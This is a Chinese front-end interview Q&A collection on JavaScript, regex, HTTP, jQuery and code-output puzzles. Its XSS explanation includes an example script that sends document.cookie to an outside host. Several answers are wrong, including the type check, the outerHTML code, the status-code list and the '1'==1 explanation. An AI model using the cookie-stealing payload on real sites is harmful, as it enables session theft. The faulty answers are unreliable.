    <content type="text"><![CDATA[正则表达式写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串^[a-zA-Z]{1}[\w]{5,29}$ 写出正确的正则表达式匹配固话号区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号 ^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$ 要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$ 输出结果是12var bool = !!2; alert(bool)；//true; 双向非操作可以把字符串和数字转换为布尔值。 声明对象，添加属性，输出属性1234567var obj = &#123; name: 'leipeng', showName: function()&#123; alert(this.name); &#125;&#125;obj.showName(); 匹配输入的字符：第一个必须是字母或下划线开头，长度5-20123456789var reg = /^[a-zA-Z_][a-zA-Z0-9_]&#123;5,20&#125;/, name1 = 'leipeng', name2 = '0leipeng', name3 = '你好leipeng', name4 = 'hi';alert(reg.test(name1));alert(reg.test(name2));alert(reg.test(name3));alert(reg.test(name4)); 检测变量类型1234function checkStr(str)&#123; return str == 'string';&#125;console.log(checkStr("aaa")); 如何在HTML中添加事件 标签之中直接添加 onclick=”fun()”;JS添加 Eobj.onclick = method;现代事件 IE： obj.attachEvent(‘onclick’, method)；FF: obj.addEventListener(‘click’, method, false); BOM对象有哪些，列举window对象 window对象 ，是JS的最顶层对象，其他的BOM对象都是window对象的属性；document对象，文档对象；location对象，浏览器当前URL信息；navigator对象，浏览器本身信息；screen对象，客户端屏幕信息；history对象，浏览器访问历史信息； 代码实现 outerHTML123456//说明：outerHTML其实就是innerHTML再加上本身； Object.prototype.outerHTML = function()&#123; var innerCon = this.innerHTML, //获得里面的内容 outerCon = this.appendChild(innerCon); //添加到里面 alert(outerCon); &#125; 演示代码： 123456789101112131415161718192021222324&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="outer"&gt; hello &lt;/div&gt; &lt;script&gt; Object.prototype.outerHTML = function() &#123; var innerCon = this.innerHTML, //获得里面的内容 outerCon = this.appendChild(innerCon); //添加到里面 alert(outerCon); &#125; function $(id)&#123; return document.getElementById(id); &#125; alert($('outer').innerHTML); alert($('outer').outerHTML); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JS中的简单继承 call方法！1234567891011121314151617181920//注意：类名都是首字母大写function Parent(name, money)&#123; this.name = name; this.money = money; this.info = function()&#123; alert('姓名： '+this.name+' 钱： '+ this.money); &#125;&#125;//定义孩子类function Children(name)&#123; Parent.call(this, name); //继承 姓名属性，不要钱。 this.info = function()&#123; alert('姓名： '+this.name); &#125;&#125;//实例化类var per = new Parent('parent', 800000000000);var chi = new Children('child');per.info();chi.info(); bind(), live(), delegate()的区别 bind： 绑定事件，对新添加的事件不起作用，方法用于将一个处理程序附加到每个匹配元素的事件上并返回jQuery对象。live： 方法将一个事件处理程序附加到与当前选择器匹配的所有元素（包含现有的或将来添加的）的指定事件上并返回jQuery对象。delegate： 方法基于一组特定的根元素将处理程序附加到匹配选择器的所有元素（现有的或将来的）的一个或多个事件上。 如何优化自己的代码 代码重用避免全局变量（命名空间，封闭空间，模块化mvc..）拆分函数避免函数过于臃肿注释 怎样实现两栏等高1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="container" style="display: table; width: 100%;"&gt; &lt;div id="left" style="background-color: red; display: table-cell;"&gt; 内容&lt;br/&gt; 内容&lt;br/&gt; 内容&lt;br/&gt; 内容&lt;br/&gt; 内容&lt;br/&gt; 内容&lt;br/&gt; &lt;/div&gt; &lt;div style="display:table-cell;"&gt;&lt;/div&gt; &lt;div id="right" style="background-color: blue;display: table-cell"&gt; 内容 &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用js实现这样的效果在文本域里输入文字时，当按下enter键时不换行，而是替换成 \{\{enter\}\}, (只需要考虑在行尾按下enter键的情况). 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;script&gt; function back(ele,event)&#123; event = event || window.event; if(event.keyCode==13)&#123; event.returnValue = false; ele.value+=&quot;&#123;&#123;enter&#125;&#125;&quot; return false; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea rows=&quot;3&quot; cols=&quot;40&quot; id=&quot;te&quot; onkeypress=&quot;back(this,event);&quot;&gt;&lt;/textarea&gt;&lt;/body&gt;&lt;/html&gt; 以下代码中end字符串什么时候输出1234567var t=true;setTimeout(function()&#123; console.log(123); t = false;&#125;, 1000);while(t)&#123;&#125;console.log(&apos;end&apos;); 结果：永远不输出 实现specify函数specify(&#39;hello,world&#39;) // =&gt;&#39;h,e,l,l,o,w,o,r,l,d&#39; 1234567function specify(str)&#123; var tempArray = Array.prototype.filter.call(str,function (value, index, array) &#123; return value &gt;= &apos;A&apos; &amp;&amp; value &lt;= &apos;z&apos; &amp;&amp; value != &quot;_&quot;; &#125;); return tempArray.join(&quot;,&quot;);&#125;console.log(specify(&quot;hedd____df*(%$#a !!!))))))llo,Wo@@@r ld&quot;)); //h,e,l,l,o,W,o,r,l,d 简述 readyonly 与 disabled 的区别ReadOnly 和 Disabled的作用是使用户不能够更改表单域中的内容. 但是二者还是有着一些区别的： 1、Readonly只针对input(text/password)和textarea有效，而disabled对于所有的表单元素有效，包括select,radio,checkbox,button等。 2、在表单元素使用了disabled后，我们将表单以POST或者GET的方式提交的话，这个元素的值不会被传递出去，而readonly会将该值传递出去 解释ajax的工作原理 Ajax的工作原理相当于在用户和服务器之间加了—个中间层，使用户操作与服务器响应异步化;这样把以前的一些服务器负担的工作转嫁到客户端，利于客户端闲置的处理能力来处理;减轻服务器和带宽的负担，从而达到节约 ISP 的空间及带宽租用成本的目的。简单来说通过 XmlHttpRequest 对象来向服务器发异步请求从服务器获得数据然后用javascript来操作DOM而更新页面 这其中最关键的一步就是从服务器获得请求数据。要清楚这个过程和原理，我们必须对 XMLHttpRequest有所了解。 为什么扩展javascript内置对象不是好的做法？因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。 什么是三元表达式？三元运算符: 三元如名字表示的三元运算符需要三个操作数。 语法是 条件 ? 结果1 : 结果2; 这里你把条件写在问号(?)的前面后面跟着用冒号(:)分隔的结果1和结果2。满足条件时结果1否则结果2。 HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？ GET没有请求主体，使用xhr.send(null) GET可以通过在请求URL上添加请求参数 POST可以通过xhr.send(‘name=itcast&amp;age=10’) POST需要设置 GET效率更好（应用多） GET大小限制约4K，POST则没有限制 HTTP状态消息200 302 304 403 404 500分别表示什么 200 代表成功 304 文档未修改 403 没有权限 404 未找到 500 服务器错误 HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）last-modified 文档的最后改动时间。 客户可以通过 If-Modified-Since 请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified 也可用 setDateHeader 方法来设置。 cache-control 告诉所有的缓存机制是否可以缓存及哪种类型 Expires 应该在什么时候认为文档已经过期，从而不再缓存它？ header标头说明 业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）1) 优化图像，使用 CSS Sprites 整合图像2) 去掉不必要的插件3) 减少DNS查询(DNS lookups)4) 最小化重定向，重定向增加了额外的HTTP请求5) 使用内容分发网络（Content Delivery Network CDN）6) 把CSS文件放在页面顶部，而JS文件放在底部7) 利用浏览器缓存8) 压缩CSS和JavaScript9) 启用GZIP压缩 使用良好的结构;不要使布局超载;不要使用图像来表示文本，图像进行导航不利于 SEO;检查 cookie 使用情况;尽可能避免使用表格;删除任何不必要的元素;一些优化网页的技巧;压缩和缩小 JavaScript 文件;设置图像大小;将 CSS 图像映射用于装饰功能;尽可能延迟脚本加载;按需加载 JavaScript 文件;优化 CSS 文件;使用内容分布网络;对资产使用多个域来增加连接;在合适的时候使用 Google Gears;使用 PNG 格式的图像;保持 Ajax 调用简短、准确;进行一次较大的 Ajax 调用并在本地处理客户机数据;在沙箱中测试代码;分析站点代码;使用 JSLint 检查 JavaScript 代码中的错误或糟糕的编码实践;检查孤立的文件和丢失的图像 ;YSlow 扩展：使用 YSlow 分析网页; 25种提高网页加载速度的方法和技巧 列举常用的 web 页面开发，调试以及优化工具开发工具：PS、FireWorks、WebStrom、SubLime Text、Eclipse、Aptana、DreamWeaver、NotePad++、Yslow调试工具：谷歌浏览器、火狐 FireBug、IETester、HTTPWatch Stadio优化工具：gulp、grunt、webpack使用率较高的框架有 jQuery、YUI、Prototype、Dojo、Ext.js、Mootools等。尤其是jQuery，超过91%。轻量级框架有 Modernizr、underscore.js、backbone.js、Raphael.js等。 解释什么是sql注入，xss漏洞所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。 XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意脚本代码，而程序对于用户输入内容未过滤；当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。1)恶意用户，在一些公共区域（例如，建议提交表单或消息公共板的输入表单）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。如：http://xxx.xxx.com.cn/intf/_photos.jsp?callback=&lt;script&gt;window.location.href=&quot;http://www.baidu.com?a=&quot; + escape(document.cookie)&lt;/script&gt;、参数&lt;script&gt;xxx&lt;/script&gt;如果这里没有经过转义处理，则页面中就嵌入了一段script。2)恶意提交这个表单3)其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。 请列举js数组类型中的常用方法 push(); 尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 赋值一样； 返回新数组长度 操作原数组，末尾追加 pop(); 删除数组中最后一个元素， 返回值是被删除的这个元素 操作原数组 shift(); 删除数组中的第一个元素， 返回值是被删除的元素 unshift(); 向数组中第一个元素之前插入一个或多个新的元素 返回值是新数组的长度 concat(); Array.concat() 方法创建并返回新数组 新的数组和旧的数组拼接，产生一个新的数组 不修改原数组 slice(); Array.slice()方法返回指定数组的一个片段或子数组 两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素； 指定一个参数，返回包含开始位置到数组结尾的所有元素 参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个 从原来的数组中截取出来指定的一部分元素，产生新的数组 不操作原数组 splice(); Array.splice()是数组中插入或删除元素的方法。 会修改调用数组， 第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数； 如果省略了第二个参数，从开始索引位置后的元素都被删除； 可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入； 该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。 join(); 将数组中的所有元素都转化成字符串并连接到一起 返回最终生成的字符串 是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组； reverse(); 反转数组 操作原数组 返回操作后的逆向数组 sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组 操作原数组； 返回排序后的数组 toString() 和不使用任何参数调用 join() 方法返回的字符串是一样的。 toLocalString() 方法是 toString() 方法的本地化版本，使用本地 化分隔符将这些字符串连接起来生成最终字符串。 indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素 查找某个元素， 第一个参数是要查找的元素, 第二个参数是开始查找的下标, 找到则返回找到的第一个元素的索引，找不到则返回-1 lastIndexOf(); 这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1； 第二个元素可以是负数，代表相对数组末尾的偏移量； every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件； every() 方法针对所有的元素判断调用函数返回全为 true，则返回true； every() 方法有一个不满足条件的则返回 false some() 方法所有的元素判断调用函数有一个满足条件的则返回 true some() 方法全为 false, 则返回 false map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个 包含该函数的数组。 返回新数组 不修改原数组 稀疏数组调用返回的还是稀疏数组 一个例子：arr.map(Math.sqrt); map这个方法可以传入一个回调函数, 直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的 调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数 map方法内部帮我们遍历并且传入数组的每个元素 filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值； 压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter(); instanceof isArray(); ECMAScript 5 中给出的检测数组类型的方法； 这个方法是判断变量是不是数组 forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数； 三个参数，数值元素、数组索引、数组本身 无法再所有元素传递完调用函数之前终止遍历 reduce()和 reduceRight() reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。 reduce() 两个参数： 第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。 第二个参数是可选参数 reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组； ECMAScript 6 中数组新方法 Array.prototype.find 方法用于找出第一个符合条件的数组成员。 参数是一个回调函数，找到第一个返回 true 的数组项，然后返回该数组项； 找不到返回undefined； 两个静态方法 Array.from 将一个伪数组转成正真的数组 Array.of 将方法中参数都添加到一个数组中 操作、填充和过滤数组的方法 Array.prototype.copyWidthin Array.prototype.fill Array.prototype.find 接收一个回调函数，每一项执行调用它 Array.prototype.findIndex 有关数组迭代的方法 Array.prototype.keys Array.prototype.values Array.prototype.entries Array.prototype[Symbol.iterator] FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素1234567891011function stopPropagation(e) &#123; e = e || window.event; if(e.stopPropagation) &#123; //W3C阻止冒泡方法 e.stopPropagation(); &#125; else &#123; e.cancelBubble = true; //IE阻止冒泡方法 &#125; &#125; document.getElementById('need_hide').onclick = function(e) &#123; stopPropagation(e); &#125; 列举常用的js框架以及分别适用的领域jQuery 库 DOM 操作Bootstrap 是 UI 组件，响应式布局Angular 框架单页应用程序 SPA 库的特点 选择器（Selector） DOM 遍历 DOM 操作 实用（Utility）函数 事件处理 Ajax js中如何实现一个map123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;!DOCTYPE html &gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;无标题文档&lt;/title&gt;&lt;script language="javascript"&gt; Array.prototype.remove = function(s) &#123; for (var i = 0; i &lt; this.length; i++) &#123; if (s == this[i]) this.splice(i, 1); &#125; &#125; function Map() &#123; /** 存放键的数组(遍历用到) */ this.keys = new Array(); /** 存放数据 */ this.data = new Object(); // 放入一个键值对 this.put = function(key, value) &#123; if(this.data[key] == null)&#123; this.keys.push(key); &#125; this.data[key] = value; &#125;; // 获取某键对应的值 this.get = function(key) &#123; return this.data[key]; &#125;; // 删除一个键值对 this.remove = function(key) &#123; this.keys.remove(key); this.data[key] = null; &#125;; // 遍历Map,执行处理函数 this.each = function(fn)&#123; if(typeof fn != 'function')&#123; return; &#125; var len = this.keys.length; for(var i=0;i&lt;len;i++)&#123; var k = this.keys[i]; fn(k,this.data[k],i); &#125; &#125;; // 获取键值数组(类似Java的entrySet()) this.entrys = function() &#123; var len = this.keys.length; var entrys = new Array(len); for (var i = 0; i &lt; len; i++) &#123; entrys[i] = &#123; key : this.keys[i], value : this.data[i] &#125;; &#125; return entrys; &#125;; // 判断Map是否为空 this.isEmpty = function() &#123; return this.keys.length == 0; &#125;; // 获取键值对数量 this.size = function()&#123; return this.keys.length; &#125;; // 重写toString this.toString = function()&#123; var s = "&#123;"; for(var i=0;i&lt;this.keys.length;i++,s+=',')&#123; var k = this.keys[i]; s += k+"="+this.data[k]; &#125; s+="&#125;"; return s; &#125;; &#125; function testMap()&#123; var m = new Map(); m.put('key1','Comtop'); m.put('key2','南方电网'); m.put('key3','景新花园'); alert("init:"+m); m.put('key1','康拓普'); alert("set key1:"+m); m.remove("key2"); alert("remove key2: "+m); var s =""; m.each(function(key,value,index)&#123; s += index+":"+ key+"="+value+"\n"; &#125;); alert(s); &#125;&lt;/script&gt;&lt;/head&gt; &lt;body onload="testMap()"&gt;&lt;/body&gt;&lt;/html&gt; 用js写一个实现map js可否实现面向对象编程，如果可以如何实现js对象的继承 扩展原型对象实现继承替换原型对象实现继承另一种原型继承（动态原型模式） 特点：让代码封装到一起混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in, jQuery的extend()方法原理是混入继承原型+混入继承：混入继承的应用, 在一个对象的原型对象上扩展另一个对象的属性和方法, jQuery.fn.extend() 利用的原理是原型+混入继承经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj,ES5 Object.create()方法的实现原理就是经典继承借用构造函数实现继承混合继承（经典继承+借用构造函数） 解决借用构造函数继承不能够继承原型对象上的方法的问题; 继承了两次构造函数（模板）混合继承（经典继承+借用构造函数） 变量的命名规范以及命名推荐 变量，函数，方法：小写开头，以后的每个单词首字母大写 （驼峰）构造函数，class：每个单词大写开头基于实际情况，以动词，名词，谓词来命名。尽量言简意骇，以命名代替注释 三种弹窗的单词以及三种弹窗的功能1) alert 12345//弹出对话框并输出一段提示信息 function ale() &#123; //弹出一个对话框 alert(&quot;提示信息！&quot;); &#125; 2) confirm 12345678910//弹出一个询问框，有确定和取消按钮 function firm() &#123; //利用对话框返回的值 （true 或者 false） if (confirm(&quot;你确定提交吗？&quot;)) &#123; alert(&quot;点击了确定&quot;); &#125; else &#123; alert(&quot;点击了取消&quot;); &#125; &#125; 3) prompt 123456789//弹出一个输入框，输入一段文字，可以提交 function prom() &#123; var name = prompt(&quot;请输入您的名字&quot;, &quot;&quot;); //将输入的内容赋给变量 name ， //这里需要注意的是，prompt有两个参数，前面是提示的话，后面是当对话框出来后，在对话框里的默认值 if (name)//如果返回的有内容 &#123; alert(&quot;欢迎您：&quot; + name) &#125;&#125; 输出值是 console.log( 8 | 1 ); // 9 求一个函数 y = f(x, a, b);只允许使用 + - / 和 Math.，当x &gt; 100 时返回 a 的值，否则返回 b 的值，不能使用 if else 等条件语句，也不能使用 |, ? :, 数组。 12345function f(x, a, b) &#123; var temp = Math.ceil(Math.min(Math.max(x - 100, 0), 1)); return a * temp + b * (1 - temp);&#125;console.log(f(-10, 1, 2)); JavaScript alert(0.4*0.2); 结果是多少? 如何处理 有误差，应该比准确结果偏大。一般我会将小数变为整数来处理。当前之前遇到这个问题时也上网查询发现有人用try catch return写了一个函数，当然原理也是一致先转为整数再计算。 一个div，有几种方式得到这个 div 的 jQuery 对象？&lt;div class=&#39;aabbcc&#39; id=&#39;nodesView&#39;&gt;&lt;/div&gt; 想直接获取这个div的dom对象，如何获取？dom对象如何转化为jQuery对象？ $(“#nodesView”)$(“.aabbcc”)$(“#nodesView”)[0]$(“.aabbcc”)[0] jQuery 框架中 $.ajax()的常用参数有哪些写一个post请求并带有发送数据和返回数据的样例 async是否异步url请求地址contentType发送信息至服务器时内容编码类型data发送到服务器的数据dataType预期服务器返回的数据类型type请求类型success请求成功回调函数error请求失败回调函数 12345678910$.ajax(&#123; url: &quot;/jquery/test1.txt&quot;, type: &apos;post&apos;, data: &#123; id: 1 &#125;, success: function(data) &#123; alert(data); &#125;&#125;); 闭包下面这个ul，如何点击每一列的时候 alert 其 index 1234567891011121314151617&lt;ul id=&quot;test&quot;&gt; &lt;li&gt;这是第一条&lt;/li&gt; &lt;li&gt;这是第二条&lt;/li&gt; &lt;li&gt;这是第三条&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; window.onload = function() &#123; var lis = document.getElementById(&apos;test&apos;).children; for (var i = 0; i &lt; lis.length; i++) &#123; lis[i].onclick = (function(i) &#123; return function() &#123; alert(i) &#125;; &#125;)(i); &#125;; &#125;&lt;/script&gt; 列出3条以上 ff 和 IE 的脚本兼容问题(1) window.event： 表示当前的事件对象，IE有这个对象，FF没有，FF通过给事件处理函数传递事件对象 (2) 获取事件源 IE用srcElement获取事件源，而FF用target获取事件源 (3) 添加，去除事件 IE：element.attachEvent(“onclick”, function) element.detachEvent(“onclick”, function)FF：element.addEventListener(“click”, function, true) element.removeEventListener(“click”, function, true) (4) 获取标签的自定义属性 IE：div1.value或div1[“value”]FF：可用div1.getAttribute(“value”); 列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个 对象：Window document location screen history navigator方法：Alert() confirm() prompt() open() close() 在Javascript中什么是伪数组？如何将伪数组转化为标准数组？ 伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。 写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;1234567891011function sum() &#123; var result = 0; var arr = arguments; for (var i = 0; i &lt; arr.length; i++) &#123; var num = arguments[i]; if (typeof num=='number') &#123; result += num; &#125;; &#125;; return result;&#125; 算法写出代码对下列数组去重并从大到小排列 {5,2,3,6,8,6,5,4,7,1,9} 1234567891011121314151617181920212223function fn(arr)&#123; for (var i = 0; i &lt; arr.length-1; i++) &#123; for (var j = 0; j &lt; arr.length-1-i; j++) &#123; if(arr[j] &lt; arr[j+1])&#123; var temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; &#125; &#125; &#125; for (i = 0; i &lt; arr.length; i++) &#123; var c = arr[i]; for (var s = i + 1; s &lt; arr.length; s++) &#123; if(arr[s] == c)&#123; //debugger; arr.splice(s,1); s--; &#125; &#125; &#125; return arr;&#125;console.log(fn([5,2,3,6,8,6,5,4,7,1,9]).toString()); 请写出一个程序在页面加载完成后动态创建一个form表单，并在里面添加一个input对象并给它任意赋值后义post方式提交到：http://127.0.0.1/save.php 12345678910window.onload=function()&#123; var form=document.createElement("form"); form.setAttribute("method", "post"); form.setAttribute("action", "http://127.0.0.1/save.php"); var input=document.createElement("input"); form.appendChild(input); document.body.appendChild(form); input.value="cxc"; form.submit();//提交表单&#125; 用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、241234567891011121314//升序算法function sort(arr)&#123; for (var i = 0; i &lt;arr.length; i++) &#123; for (var j = 0; j &lt;arr.length-i; j++) &#123; if(arr[j]&gt;arr[j+1])&#123; var c=arr[j];//交换两个变量的位置 arr[j]=arr[j+1]; arr[j+1]=c; &#125; &#125;; &#125;; return arr.toString();&#125;console.log(sort([23,45,18,37,92,13,24])); 前端代码优化的方法123456789var User = &#123; count = 1， getCount：function（）&#123; return this.count; &#125;&#125;console.log(User.getCount());var func = User.getCount;console.log(func()); 输出结果：1 undefined（因为是window对象执行了func函数）; 下列JavaScript代码执行后，依次alert的结果是1234567(function test()&#123; var a=b=5; alert(typeof a); alert(typeof b);&#125;)();alert(typeof a);alert(typeof b); 输出结果：numbernumberundefinednumber 下列JavaScript代码执行后，iNum的值是1234567var iNum = 0;for(var i = 1; i&lt; 10; i++)&#123; if(i % 5 == 0)&#123; continue; &#125; iNum++;&#125; 输出结果：答案：8 输出结果是多少1） 1234567var a;var b = a * 0;if (b == b) &#123; console.log(b * 2 + "2" - 0 + 4);&#125; else &#123; console.log(!b * 2 + "2" - 0 + 4);&#125; 输出结果：26 2） 123456789101112&lt;script&gt; var a = 1;&lt;/script&gt;&lt;script&gt; var a; var b = a * 0; if (b == b) &#123; console.log(b * 2 + "2" - 0 + 4); &#125; else &#123; console.log(!b * 2 + "2" - 0 + 4); &#125;&lt;/script&gt; 输出结果：6 3） 12345var t = 10;function test(t)&#123; var t = t++;&#125;test(t);console.log(t); 输出结果：10 4） 12345var t = 10;function test(test)&#123; var t = test++;&#125;test(t);console.log(t); 输出结果：10 5） 12345var t = 10;function test(test)&#123; t = test++;&#125;test(t);console.log(t); 输出结果：10 6） 1234567var t = 10;function test(test)&#123; t = t + test; console.log(t); var t = 3;&#125;test(t);console.log(t); 输出结果：NaN 10 7） 1234567var a;var b = a / 0;if (b == b) &#123; console.log(b * 2 + "2" - 0 + 4);&#125; else &#123; console.log(!b * 2 + "2" - 0 + 4);&#125; 输出结果：”26” 8） 123456789101112&lt;script&gt; var a = 1;&lt;/script&gt;&lt;script&gt; var a; var b = a / 0; if (b == b) &#123; console.log(b * 2 + "2" + 4); &#125; else &#123; console.log(!b * 2 + "2" + 4); // !Infinity --&gt;false &#125;&lt;/script&gt; 输出结果：Infinity24 用程序实现找到html中id名相同的元素？ 1234567891011121314151617181920212223&lt;body&gt; &lt;form id='form1'&gt; &lt;div id='div1'&gt;&lt;/div&gt; &lt;div id='div2'&gt;&lt;/div&gt; &lt;div id='div3'&gt;&lt;/div&gt; &lt;div id='div4'&gt;&lt;/div&gt; &lt;div id='div5'&gt;&lt;/div&gt; &lt;div id='div3'&gt;id名重复的元素&lt;/div&gt; &lt;/form&gt; &lt;script&gt; var nodes = document.querySelectorAll("#form1&gt;*"); for(var i = 0, len = nodes.length; i &lt; len; i++)&#123; var attr = nodes[i].getAttribute("id"); var s=1; for(var j = i + 1; j &lt; len; j++)&#123; if(nodes[j].getAttribute("id") == attr)&#123; s++; alert("id为：" + attr + "的元素出现" + s + "次"); &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt; 输出结果：id为：div3的元素出现2次 下列JavaScript代码执行后，运行的结果是1234567891011&lt;button id='btn'&gt;点击我&lt;/button&gt;&lt;script&gt; var btn = document.getElementById('btn'); var handler = &#123; id: '_eventHandler', exec: function()&#123; alert(this.id); &#125; &#125; btn.addEventListener('click', handler.exec);&lt;/script&gt; 输出结果：”btn” 下列JavaScript代码执行后，依次 alert 的结果1234567891011var obj = &#123;proto: &#123;a:1,b:2&#125;&#125;;function F()&#123;&#125;;F.prototype = obj.proto;var f = new F();obj.proto.c = 3;obj.proto = &#123;a:-1, b:-2&#125;;alert(f.a); // 1alert(f.c); // 3delete F.prototype['a'];alert(f.a); // undefinedalert(obj.proto.a); // -1 下列JavaScript代码执行后的效果是123456789101112131415&lt;ul id='list'&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; var items = document.querySelectorAll('#list &gt; li'); for(var i = 0; i &lt; items.length; i++)&#123; setTimeout(function()&#123; items[i].style.backgroundColor = '#fee'; &#125;, 5); &#125;&lt;/script&gt; 输出结果：报错，因为i一直等于5，items[i]获取不到元素 下列JavaScript代码执行后的 li 元素的数量是123456789101112131415&lt;ul&gt; &lt;li&gt;Item&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;Item&lt;/li&gt; &lt;li&gt;Item&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; var items = document.getElementsByTagName('li'); for(var i = 0; i &lt; items.length; i++)&#123; if(items[i].innerHTML == '')&#123; items[i].parentNode.removeChild(items[i]); &#125; &#125;&lt;/script&gt; 结果是：4 程序中捕获异常的方法12window.error;try&#123;&#125;catch()&#123;&#125;finally&#123;&#125; 原型对象上添加方法给String对象添加一个方法，传入一个 string 类型的参数，然后将 string 的每个字符间价格空格返回例如：addSpace(&quot;hello world&quot;) // -&gt; &#39;h e l l o w o r l d&#39; 123String.prototype.spacify = function()&#123; return this.split('').join(' ');&#125;; 数组和字符串123456789101112131415function outPut(s) &#123; document.writeln(s);&#125;var a = "lashou";var b = a;outPut(b);a = "拉手";outPut(a);outPut(b);var a_array = [1, 2, 3];var b_array = a_array;outPut(b_array);a_array[3] = 4;outPut(a_array);outPut(b_array); 输出结果：lashou 拉手 lashou 1,2,3 1,2,3,4 1,2,3,4 下列控制台都输出什么第1题： 12345function setName()&#123; name=&quot;张三&quot;;&#125;setName();console.log(name); // 答案：&quot;张三&quot; 第2题： 1234567//考点：1、变量声明提升 2、变量搜索机制var a=1;function test()&#123; console.log(a); // 答案：undefined var a=1;&#125;test(); 第3题： 123456var b=2;function test2()&#123; window.b=3; console.log(b); // 答案：3&#125;test2(); 第4题： 12345678c=5;//声明一个全局变量c function test3()&#123; window.c=3; console.log(c); //答案：undefined，原因：由于此时的c是一个局部变量c，并且没有被赋值 var c; console.log(window.c);//答案：3，原因：这里的c就是一个全局变量c&#125;test3(); 第5题： 123456var arr = [];arr[0] = &apos;a&apos;;arr[1] = &apos;b&apos;;arr[10] = &apos;c&apos;;alert(arr.length); //答案：11console.log(arr[5]); //答案：undefined 第6题： 123var a=1;console.log(a++); //答案：1console.log(++a); //答案：3 第7题： 123console.log(null==undefined); //答案：trueconsole.log(&quot;1&quot;==1); //答案：true，因为会将数字1先转换为字符串1console.log(&quot;1&quot;===1); //答案：false，因为数据类型不一致 第8题： 12345678typeof 1; &quot;number&quot;typeof &quot;hello&quot;; &quot;string&quot;typeof /[0-9]/; &quot;object&quot;typeof &#123;&#125;; 